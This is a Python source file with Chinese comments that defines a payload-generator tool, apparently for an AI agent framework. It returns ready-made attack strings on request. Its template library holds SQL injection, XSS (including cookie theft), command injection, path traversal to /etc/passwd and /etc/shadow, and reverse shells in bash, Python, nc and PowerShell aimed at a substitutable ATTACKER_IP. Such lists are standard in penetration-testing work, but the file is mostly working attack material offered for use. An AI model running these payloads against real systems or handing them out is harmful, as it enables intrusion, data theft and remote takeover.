"""攻击载荷生成器：生成常见漏洞利用 payload（仅生成文本，不执行）"""
from typing import Any, Dict, List
from tools.base import BaseTool, ToolResult


# Payload 模板库
PAYLOAD_TEMPLATES = {
    "sqli": {
        "description": "SQL 注入 Payload",
        "payloads": {
            "auth_bypass": [
                "' OR '1'='1'--",
                "' OR '1'='1'/*",
                "admin'--",
                "' OR 1=1#",
                "\" OR \"\"=\"",
            ],
            "union_based": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,user(),database()--",
                "' UNION SELECT 1,table_name,NULL FROM information_schema.tables--",
            ],
            "error_based": [
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND extractvalue(1,concat(0x7e,version()))--",
            ],
            "time_based": [
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(5000000,SHA1('test'))--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND pg_sleep(5)--",
            ],
        },
    },
    "xss": {
        "description": "跨站脚本 Payload",
        "payloads": {
            "basic": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
            ],
            "filter_bypass": [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
                "<svg/onload=alert&#40;'XSS'&#41;>",
                "'-alert('XSS')-'",
                "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            ],
            "dom_based": [
                "';alert(document.domain)//",
                "\"><img src=x onerror=alert(document.cookie)>",
                "javascript:alert(document.domain)",
            ],
        },
    },
    "cmd_inject": {
        "description": "命令注入 Payload",
        "payloads": {
            "linux": [
                "; id", "| id", "$(id)", "`id`",
                "; cat /etc/passwd", "| cat /etc/passwd",
                "; whoami", "$(whoami)",
                "\n id", "& id",
            ],
            "windows": [
                "& dir", "| dir", "& whoami", "| whoami",
                "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "& net user",
            ],
            "blind": [
                "; sleep 5", "| sleep 5", "$(sleep 5)",
                "& ping -c 5 127.0.0.1 &",
                "| ping -n 5 127.0.0.1",
            ],
        },
    },
    "reverse_shell": {
        "description": "反向 Shell Payload（需替换 IP 和端口）",
        "payloads": {
            "bash": [
                "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
                "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
            ],
            "python": [
                "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",
            ],
            "nc": [
                "nc -e /bin/sh {ip} {port}",
                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            ],
            "powershell": [
                "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}}\"",
            ],
        },
    },
    "path_traversal": {
        "description": "路径穿越 Payload",
        "payloads": {
            "linux": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "../../../etc/shadow",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "/etc/passwd%00",
            ],
            "windows": [
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
                "....\\\\....\\\\windows\\\\win.ini",
            ],
        },
    },
}


class PayloadGeneratorTool(BaseTool):
    """攻击载荷生成器（仅生成文本，不执行）"""

    sensitivity = "high"

    def __init__(self):
        super().__init__(
            name="payload_generator",
            description=(
                "生成常见漏洞利用 payload 文本（SQL注入/XSS/命令注入/反向Shell/路径穿越）。"
                "仅返回 payload 字符串，不执行任何攻击。"
                "参数: type(sqli/xss/cmd_inject/reverse_shell/path_traversal), "
                "sub_type(子类型,可选), platform(目标平台,可选), "
                "ip(反向Shell用的监听IP,可选), port(反向Shell用的监听端口,可选)"
            ),
        )

    async def execute(self, **kwargs) -> ToolResult:
        payload_type = kwargs.get("type", "").strip().lower()
        sub_type = kwargs.get("sub_type", "").strip().lower()
        platform = kwargs.get("platform", "").strip().lower()
        ip = kwargs.get("ip", "ATTACKER_IP").strip()
        port = kwargs.get("port", "4444").strip()

        if not payload_type:
            return ToolResult(
                success=False, result=None,
                error=f"缺少参数: type，可选值: {list(PAYLOAD_TEMPLATES.keys())}",
            )

        if payload_type not in PAYLOAD_TEMPLATES:
            return ToolResult(
                success=False, result=None,
                error=f"不支持的类型: {payload_type}，可选: {list(PAYLOAD_TEMPLATES.keys())}",
            )

        template = PAYLOAD_TEMPLATES[payload_type]
        all_payloads = template["payloads"]

        # 根据 sub_type 或 platform 筛选
        if sub_type and sub_type in all_payloads:
            selected = {sub_type: all_payloads[sub_type]}
        elif platform and platform in all_payloads:
            selected = {platform: all_payloads[platform]}
        else:
            selected = all_payloads

        # 替换反向 Shell 中的变量
        result_payloads = {}
        for category, payloads in selected.items():
            replaced = []
            for p in payloads:
                replaced.append(p.replace("{ip}", ip).replace("{port}", str(port)))
            result_payloads[category] = replaced

        total = sum(len(v) for v in result_payloads.values())

        return ToolResult(
            success=True,
            result={
                "type": payload_type,
                "description": template["description"],
                "total_payloads": total,
                "payloads": result_payloads,
                "note": "以上 payload 仅供安全测试使用，请确保已获得授权",
            },
        )

    def get_schema(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "description": self.description,
            "sensitivity": self.sensitivity,
            "parameters": {
                "type": {
                    "type": "string",
                    "description": "Payload 类型: sqli/xss/cmd_inject/reverse_shell/path_traversal",
                    "required": True,
                },
                "sub_type": {"type": "string", "description": "子类型（如 auth_bypass/union_based 等）", "required": False},
                "platform": {"type": "string", "description": "目标平台（如 linux/windows）", "required": False},
                "ip": {"type": "string", "description": "监听 IP（反向 Shell 用）", "required": False},
                "port": {"type": "string", "description": "监听端口（反向 Shell 用，默认 4444）", "required": False},
            },
        }
